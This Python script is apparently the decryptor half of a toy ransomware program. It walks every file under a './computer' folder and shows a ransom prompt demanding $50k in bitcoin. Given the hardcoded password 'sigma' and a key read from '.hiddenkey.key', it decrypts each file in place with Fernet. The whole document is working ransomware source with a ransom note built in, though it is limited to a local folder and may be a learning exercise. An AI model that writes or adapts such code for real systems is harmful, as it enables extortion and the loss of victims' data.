#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

folder = "./computer"


def file_picker(folder):
    files = []

    for file in os.listdir(folder):
        file_path = os.path.join(folder, file)

        if os.path.isfile(file_path):
            files.append(file_path)

        elif os.path.isdir(file_path):
            files.extend(file_picker(file_path))

    return files


print("retrieving files...")
files = file_picker(folder)

print("Taking in a decryption key")
user_pwd = input(
    '''
Please enter password:

If you do not have the password, pay $50k 
in bitcoin to NoobGrinder420@bitcoin

(or find .hiddenkey.key)
'''
)

try:
    print("retrieving hidden key...")
    with open(".hiddenkey.key", "rb") as fin:
        key = fin.read()

    if user_pwd != "sigma":
        print("Invalid password! Files remain locked.")
        exit(1)

    print("decrypting files...")
    for file in files:
        with open(file, "rb") as fin:
            content = fin.read()

        decrypted_content = Fernet(key).decrypt(content)

        with open(file, "wb") as fout:
            fout.write(decrypted_content)

    print("files unlocked successfully!")

except FileNotFoundError:
    print(".hiddenkey.key not found! Decryption failed.")
    exit(1)

except Exception as e:
    print(f"an error occurred: {e}")
    exit(1)

